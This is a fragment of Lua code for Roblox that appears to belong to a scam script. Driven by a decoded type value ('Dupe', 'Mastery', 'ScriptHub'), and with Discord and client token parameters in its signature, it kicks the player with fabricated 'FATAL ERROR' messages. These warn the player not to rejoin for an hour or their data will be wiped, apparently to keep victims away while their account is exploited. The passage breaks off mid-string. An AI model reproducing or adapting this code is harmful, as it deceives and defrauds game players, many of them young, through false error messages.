...
return function(Me,client_id,client_token,DiscordID,typ)
    ...
    if dec(typ) == "Dupe" then
        game.Players.LocalPlayer:Kick([[
            You have been kicked. Please rejoin at least an hour from now for these changes to save!
        ]])
    elseif dec(typ) == "Mastery" then
        game.Players.LocalPlayer:Kick([[
            You have been kicked. Please rejoin at least an hour from now for the mastery to be fully complete!
        ]])
    elseif dec(typ) == "ScriptHub" then
        game.Players.LocalPlayer:Kick([[
            A FATAL ERROR OCCURED!
            DO NOT PLAY THIS GAME FOR AT LEAST AN HOUR FOR YOUR DATA TO NOT GET WIPED
        ]])
    else
        game.Players.LocalPlayer:Kick([[
            A FATAL ERROR OCCURED!
